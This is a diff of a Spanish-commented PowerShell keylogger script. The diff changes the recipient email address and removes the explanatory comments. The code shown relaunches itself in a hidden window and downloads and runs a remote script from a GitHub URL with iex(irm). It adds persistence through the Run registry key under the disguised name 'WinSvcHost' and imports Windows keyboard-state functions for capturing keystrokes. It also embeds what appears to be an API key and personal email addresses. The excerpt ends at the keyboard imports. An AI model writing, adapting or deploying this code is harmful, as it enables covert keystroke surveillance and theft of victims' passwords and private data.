@@ -1,26 +1,22 @@
 # Keylogger de sesion
 $Clave   = 're_bieTm8sv' + '_8Mahptsrwdb5TjLx4adshvoa'
-$Correo  = 'adriancorreagutierrez@gmail.com'
+$Correo  = 'elgono_9@hotmail.com'
 $Enlace  = 'https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
 $Minutos = 1
 $Nombre  = 'WinSvcHost'
 
-# Si la ventana esta visible, relanzarse oculto y cerrar esta
 if ($env:OCULTO -ne '1') {
     $env:OCULTO = '1'
     Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoP','-NonI','-C',"iex(irm '$Enlace')"
     exit
 }
 
-# una sola instancia
 $candado = New-Object System.Threading.Mutex($false, "Local\$Nombre")
 if (-not $candado.WaitOne(0)) { exit }
 
-# Persistencia
 Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
     -Name $Nombre -Value "powershell -W Hidden -c iex(irm '$Enlace')" -Force
 
-# Funciones de Windows para leer el teclado
 Add-Type -MemberDefinition @'
 [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
 [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
